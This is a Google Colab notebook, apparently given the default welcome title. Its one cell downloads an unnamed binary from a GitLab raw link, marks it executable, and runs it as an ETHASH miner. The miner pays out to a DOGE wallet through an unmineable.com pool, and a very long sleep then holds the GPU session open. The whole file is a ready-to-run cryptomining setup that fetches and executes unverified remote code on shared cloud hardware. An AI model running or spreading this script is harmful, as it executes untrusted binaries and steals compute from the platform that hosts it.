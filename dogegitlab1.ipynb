{
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "! wget https://gitlab.com/jiorio669/donlod/-/raw/main/loly\n",
        "! chmod +x loly\n",
        "! ./loly -a ETHASH --pool ethash.unmineable.com:3333 --user DOGE:DQCzjm9pouiN7YgJxXV62ANKiS3mno6afR.99_0_8013_983\n",
        "! sleep 999999999"
      ],
      "metadata": {
        "id": "72N57rhxe-NJ"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "name": "Selamat Datang di Colaboratory",
      "toc_visible": true,
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "GPU"
  },
  "nbformat": 4,
  "nbformat_minor": 0
}